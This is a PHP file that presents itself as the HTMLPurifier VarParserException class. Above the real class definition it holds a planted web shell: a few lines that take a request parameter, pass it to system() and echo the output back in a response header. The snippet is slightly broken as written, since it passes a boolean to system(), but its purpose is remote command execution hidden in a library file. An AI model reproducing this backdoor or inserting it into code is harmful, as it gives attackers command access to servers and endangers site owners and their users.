<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

/**
 * Exception type for HTMLPurifier_VarParser
 */
class HTMLPurifier_VarParserException extends HTMLPurifier_Exception
{

}

// vim: et sw=4 sts=4
